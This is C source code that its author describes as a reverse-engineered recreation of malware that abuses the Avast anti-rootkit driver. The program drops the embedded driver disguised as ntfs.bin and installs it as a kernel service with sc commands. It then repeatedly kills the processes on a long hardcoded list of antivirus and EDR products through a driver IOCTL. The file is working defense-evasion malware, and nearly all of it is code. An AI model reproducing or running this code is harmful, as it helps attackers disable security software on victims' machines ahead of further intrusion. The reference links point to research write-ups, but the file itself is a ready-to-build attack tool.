#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include "driver.h"

/*
[NOTE]:
This is not the official code, it is just a recreation made by me by reverse engineering the malware from the sample found on MalwareBazaar

[REFERENCES]:
* https://www.trellix.com/blogs/research/when-guardians-become-predators-how-malware-corrupts-the-protectors/
* https://www.bleepingcomputer.com/news/security/hackers-abuse-avast-anti-rootkit-driver-to-disable-defenses/
* https://caveiratech.com/post/malware-burla-antivirus-6715616
* https://www.joesandbox.com/analysis/1562334/1/html
* https://bazaar.abuse.ch/sample/e882af8b945c92e5a7dd337378e6a8bffc2b93f1e2719e853d756123cc8ab947/

*/

#define MAGIC_IOCTL_CODE 0x9988c094

const wchar_t* secSoftwareBlackList[] = {
    L"ERAAgent.exe",                        L"avpsus.exe",                          L"ekrn.exe",
    L"eguiProxy.exe",                       L"efwd.exe",                            L"avpui.exe",
    L"MsMpEng.exe",                         L"agentsvc.exe",                        L"SophosSafestore64.exe",
    L"mcupdatemgr.exe",                     L"QcShm.exe",                           L"ModuleCoreService.exe",
    L"PEFService.exe",                      L"McAWFwk.exe",                         L"mfeatp.exe",
    L"mfeesp.exe",                          L"mfefw.exe",                           L"mfewch.exe",
    L"mfehcs.exe",                          L"mfeensppl",                           L"mfemms.exe",
    L"mfevtps.exe",                         L"mcshield.exe",                        L"mfetp.exe",
    L"mfewc.exe",                           L"McCSPServiceHost.exe",                L"Launch.exe",
    L"delegate.exe",                        L"McDiReg.exe",                         L"McPvTray.exe",
    L"McInstruTrack.exe",                   L"McUICnt.exe",                         L"ProtectedModuleHost.exe",
    L"MMSSHOST.exe",                        L"MfeAVSvc.exe",                        L"alsvc.exe",
    L"msmpeng.exe",                         L"sophosui.exe",                        L"avastsvc.exe",
    L"notifier.exe",                        L"ssdvagent.exe",                       L"avastui.exe",
    L"ntrtscan.exe",                        L"sspservice.exe",                      L"avp.exe",
    L"paui.exe",                            L"svcgenerichost.exe",                  L"pccntmon.exe",
    L"swc_service.exe",                     L"bcc.exe",                             L"psanhost.exe",
    L"swi_fc.exe",                          L"bccavsvc.exe",                        L"psuamain.exe",
    L"swi_service.exe",                     L"ccsvchst.exe",                        L"psuaservice.exe",
    L"tesvc.exe",                           L"clientmanager.exe",                   L"remediationservice.exe",
    L"TmCCSF.exe",                          L"coreframeworkhost.exe",               L"repmgr.exe",
    L"tmcpmadapter.exe",                    L"coreserviceshell.exe",                L"RepUtils.exe",
    L"tmlisten.exe",                        L"cpda.exe",                            L"repux.exe",
    L"updaterui.exe",                       L"cptraylogic.exe",                     L"savadminservice.exe",
    L"vapm.exe",                            L"cptrayui.exe",                        L"savapi.exe",
    L"VipreNis.exe",                        L"cylancesvc.exe",                      L"savservice.exe",
    L"vstskmgr.exe",                        L"ds_monitor.exe",                      L"avpsus.exe",
    L"SBAMSvc.exe",                         L"wrsa.exe",                            L"dsa.exe",
    L"sbamtray.exe",                        L"sophossafestore.exe",                 L"efrservice.exe",
    L"sbpimsvc.exe",                        L"sophoslivequeryservice.exe",          L"epam_svc.exe",
    L"scanhost.exe",                        L"sophososquery.exe",                   L"epwd.exe",
    L"sdcservice.exe",                      L"sophosfimservice.exe",                L"hmpalert.exe",
    L"SEDService.exe",                      L"sophosmtrextension.exe",              L"hostedagent.exe",
    L"sentinelagent.exe",                   L"sophoscleanup.exe",                   L"idafserverhostservice.exe",
    L"SentinelAgentWorker.exe",             L"sophos ui.exe",                       L"iptray.exe",
    L"sentinelhelperservice.exe",           L"cloudendpointservice.exe",            L"klnagent.exe",
    L"sentinelservicehost.exe",             L"cetasvc.exe",                         L"logwriter.exe",
    L"sentinelstaticenginescanner.exe",     L"endpointbasecamp.exe",                L"macmnsvc.exe",
    L"SentinelUI.exe",                      L"wscommunicator.exe",                  L"macompatsvc.exe",
    L"sepagent.exe",                        L"dsa-connect.exe",                     L"masvc.exe",
    L"sepWscSvc64.exe",                     L"responseservice.exe",                 L"mbamservice.exe",
    L"sfc.exe",                             L"epab_svc.exe",                        L"mbcloudea.exe",
    L"smcgui.exe",                          L"fsagentservice.exe",                  L"mcsagent.exe",
    L"SophosCleanM64.exe",                  L"endpoint agent tray.exe",             L"mcsclient.exe",
    L"sophosfilescanner.exe",               L"easervicemonitor.exe",                L"mctray.exe",
    L"sophosfs.exe",                        L"aswtoolssvc.exe",                     L"mfeann.exe",
    L"SophosHealth.exe",                    L"avwrapper.exe",                       L"mfemactl.exe",
    L"SophosNtpService.exe",
};

DWORD GetPID(LPCWSTR pn)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (!lstrcmpiW((LPCWSTR)pE.szExeFile, pn))
                {
                    procId = pE.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, procId);
    if (processHandle != NULL) {
        CloseHandle(processHandle);
        return procId;
    }

    procId = 0;
    return procId;
}

int main()
{
    FILE* driverFd;
    char driverPath[] = "C:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\ntfs.bin";

    if (fopen_s(&driverFd, driverPath, "wb") == 0) {
        fwrite(&driverBuffer, driverBufferSize, 1, driverFd);
        fclose(driverFd);
    }
    else {
        puts("Error opening output file, the driver might already exist on the disk :)");
    }

    system("sc create aswArPot.sys type=kernel binpath=C:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\ntfs.bin");
    system("sc start aswArPot.sys");
    printf("\n[*] Enumerating target processes\n[*] Entering main loop... \n");

    DWORD bytesReturned;
    const char* killResponse;
    do {
        for (int i = 0; i < sizeof(secSoftwareBlackList) / sizeof(secSoftwareBlackList[0]); i++) {
            DWORD pid = GetPID(secSoftwareBlackList[i]);
            HANDLE hDevice = CreateFileW(L"\\\\.\\aswSP_Avar", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (!hDevice) {
                printf("[!] Connection to the driver failed [!]\n");
                CloseHandle(hDevice);
                exit(0);
            }

            if (pid != 0) {
                BOOL killStatus = DeviceIoControl(hDevice, MAGIC_IOCTL_CODE, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);

                if (killStatus == 0) {
                    killResponse = "[!!!] Killing process %ls with PID %u failed [!!!]\n";
                }
                else {
                    killResponse = "[+++] Process %ls with PID %u killed [+++]\n";
                }

                printf(killResponse, secSoftwareBlackList[i], pid);
            }
            CloseHandle(hDevice);
        }
        Sleep(1000);
    } while (true);

    return 0;
}